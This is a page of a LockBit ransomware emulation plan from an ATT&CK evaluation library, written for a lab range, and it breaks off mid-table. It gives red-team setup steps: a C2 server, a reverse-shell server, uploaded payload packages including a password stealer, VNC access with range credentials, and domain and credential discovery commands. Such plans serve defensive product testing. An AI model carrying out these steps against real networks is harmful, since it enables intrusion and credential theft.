<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ST8G6EL3M2"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-ST8G6EL3M2');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.8.1.800553374803">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.8.1">

    <!-- Primary Meta Tags -->
    <title>LockBit Scenario Overview</title>
    <meta name="title" content="LockBit Scenario Overview">
    <meta name="description" content="Legend of symbols:">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/lockbit/emulation_plan/er6_lockbit_scenario/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/lockbit/emulation_plan/er6_lockbit_scenario/">
    <meta property="og:title" content="LockBit Scenario Overview">
    <meta property="og:description" content="Legend of symbols:">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/lockbit/emulation_plan/er6_lockbit_scenario/">
    <meta property="twitter:title" content="LockBit Scenario Overview">
    <meta property="twitter:description" content="Legend of symbols:">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.8.1.800553374803" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.8.1" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.8.1.800553374803" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.8.1.800553374803" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Enterprise
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/lockbit/" class="pr-4">
                                                Lock​Bit
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/lockbit/emulation_plan/" class="pr-4">
                                                Lock​Bit Emulation Plans
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/lockbit/emulation_plan/er6_lockbit_scenario/" class="pr-4">
                                                Lock​Bit Scenario Overview
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="lockbit-scenario-overview" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#lockbit-scenario-overview">#</doc-anchor-trigger>
        <span>LockBit Scenario Overview</span>
    </h1>
</doc-anchor-target>
<p>Legend of symbols:</p>
<ul>
<li><span class="docs-emoji">&#x1F4A1;</span> - callout notes</li>
<li><span class="docs-emoji">&#x2757;</span> - extremely important note</li>
<li><span class="docs-emoji">&#x27A1;&#xFE0F;</span> - Switching to another session</li>
<li><span class="docs-emoji">&#x2B55;</span> - Disconnect from RDP</li>
<li><span class="docs-emoji">&#x1F534;</span> - Sign out of RDP</li>
<li><span class="docs-emoji">&#x1F4F7;</span> - take a screenshot</li>
<li><span class="docs-emoji">&#x1F551;</span> - Record timestamp</li>
<li><span class="docs-emoji">&#x1F50A;</span> - Noise activity</li>
</ul>
<hr>
<doc-anchor-target id="step-0---red-setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---red-setup">#</doc-anchor-trigger>
        <span>Step 0 - Red Setup</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="biohazard-procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Initiate an RDP session to the Kali attack host <code v-pre>corsair (223.246.0.70)</code></p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>IP</th>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>223.246.0.70</td>
<td>op1</td>
<td>Subpar-Parabola</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:</p>
<ul>
<li>Simple File Server</li>
<li>StealBit</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd LockBit/Resources/control_server
sudo go build -o controlServer main.go
sudo ./controlServer -c config/lockbit.yml</code></pre>
</doc-codeblock></div>
</li>
<li><p>Right-click within the terminal window and click &quot;Split Terminal
Horizontally&quot;. Within the new terminal, change directory to the location of the
evalsC2client.py and <strong>use this terminal for tasking implants</strong>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd LockBit/Resources/control_server</code></pre>
</doc-codeblock></div>
</li>
<li><p>In a new terminal window elevate to sudo</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo su</code></pre>
</doc-codeblock></div>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>Subpar-Parabola</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Start the ThunderShell server:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd LockBit/Resources/ThunderShell
LD_LIBRARY_PATH=/home/kali/.pyenv/versions/3.7.17/lib:$LD_LIBRARY_PATH
PYTHONPATH=/home/kali/.pyenv/versions/3.7.17/lib/python3.7/site-packages:$PYTHONPATH
PATH=/home/kali/.pyenv/versions/3.7.17/bin:$PATH
python3.7 ThunderShell.py default.json kali</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="step-0---range-setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---range-setup">#</doc-anchor-trigger>
        <span>Step 0 - Range Setup</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="biohazard-procedures-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-1">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>On the taskbar in Kali, click the Firefox icon to open Mozilla Firefox.
Within Firefox Browse to
the following URL <code v-pre>http://27.21.12.121:8081/nexus</code>.</p>
</li>
<li><p>Log in using the following credentials.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>admin</td>
<td>admin123</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>On the left hand side, select repositories, then click the
<code v-pre>chocolatey-hosted</code> repository.</p>
</li>
<li><p>On the bottom half of the screen select <code v-pre>NuPkg Upload</code> &gt; <code v-pre>Browse...</code>.</p>
</li>
<li><p>Browse to <code v-pre>LockBit/Resources/payloads/</code>, select
the <code v-pre>.NuGet</code> package
to upload, then press <code v-pre>Add Package</code>. Repeat this for each of the following:</p>
<ul>
<li><code v-pre>BlockLit.1.0.1.nupkg</code> (LockBit Payload)</li>
<li><code v-pre>Connhost.1.0.1.nupkg</code> (StealBit Payload)</li>
<li><code v-pre>FoxAdminPro.1.0.1.nupkg</code> (Firefox password stealer)</li>
<li><code v-pre>Termini.1.0.1.nupkg</code> (Thundershell reverse shell)</li>
</ul>
</li>
<li><p>After ALL four (4) packages have been added, press <code v-pre>Upload Package(s)</code>.</p>
</li>
</ul>
<doc-anchor-target id="step-1---initial-access-evaluation-step-9">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-access-evaluation-step-9">#</doc-anchor-trigger>
        <span>Step 1 - Initial Access (Evaluation Step 9)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate gains initial access to the victim environment via
compromised credentials providing VNC access to <code v-pre>quirrell (10.111.9.202)</code> as
<code v-pre>decryptmalfoy.net\gornuk</code>.</p>
<doc-anchor-target id="biohazard-procedures-2">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-2">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, search for and
open TightVNC &gt; TightVNC Viewer. Enter the following to connect to
<code v-pre>quirrell (10.111.9.202)</code>, click the <code v-pre>Connect</code> button then paste the password into
the password field when prompted:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>VNC server</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.111.9.202::5900</td>
<td>test1234</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> log in using gornuk&#x27;s credentials</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>decryptmalfoy\gornuk</td>
<td>Concave-Monsieur</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the vnc connection</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit affiliate leverages TightVNC to access <code v-pre>quirrell (10.111.9.202)</code></td>
<td>-</td>
<td>T1133 External Remote Services</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy Labs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate authenticates using valid VNC account</td>
<td>-</td>
<td>T1078 Valid Accounts</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy Labs</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-2---execution-evaluation-step-10">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---execution-evaluation-step-10">#</doc-anchor-trigger>
        <span>Step 2 - Execution (Evaluation Step 10)</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>The LockBit affiliate executes several discovery commands to enumerate domain
controllers, domain trusts, cached passwords, domain and local groups, and
services running on <code v-pre>quirrell (10.111.9.202)</code>.</p>
<doc-anchor-target id="biohazard-procedures-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-3">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within your TightVNC session to <code v-pre>quirrell (10.111.9.202)</code>, search for Command
Prompt and right-click to Run as Administrator</p>
</li>
<li><p>Within the Command Prompt, execute the following to discover domain
information:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">nltest /dclist:decryptmalfoy.net &amp; cmdkey /list &amp; net group &quot;Domain Admins&quot; /domain &amp; net group &quot;Enterprise Admins&quot; /domain &amp; net localgroup Administrators /domain &amp; net localgroup Administrators</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the command output.</p>
</li>
<li><p>Within the Command Prompt, execute the following to gather information about
running services:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-batch"><code v-pre class="language-batch">powershell /c &quot;get-wmiobject Win32_Service |where-object { $_.PathName -notmatch \&quot;C:\Windows\&quot; -and $_.State -eq \&quot;Running\&quot;} | select-object name, displayname, state, pathname&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the command output.</p>
</li>
<li><p>Minimize the elevated Command Prompt for later use</p>
</li>
</ul>
<doc-anchor-target id="noise">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#noise">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50A;</span> Noise</span>
    </h3>
</doc-anchor-target>
<p>The following noise activity is executed:</p>
<ul>
<li>User will create symbolic links to the volume shadow copy
<ul>
<li><code v-pre>cmd /c mklink /D C:\\Temp\\vss \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\</code></li>
</ul>
</li>
<li>User will execute following commands in PowerShell:
<ul>
<li><code v-pre>Get-ChildItem</code></li>
<li><code v-pre>Set-Location -Path C:\\Users\\Public\\</code></li>
<li><code v-pre>New-Item -ItemType File -Name new_readme_report.txt</code></li>
<li><code v-pre>Remove-Item new_readme_report.txt</code></li>
</ul>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>LockBit affiliate opens Command Prompt</td>
<td>-</td>
<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes <code v-pre>nltest /dclist:</code></td>
<td>-</td>
<td>T1018 Remote System Discovery</td>
<td><a href="https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/" class="outbound" target="_blank"><span>nccgroup</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate executes <code v-pre>nltest /domain_trusts</code></td>
<td>-</td>
<td>T1482 Domain Trust Discovery</td>
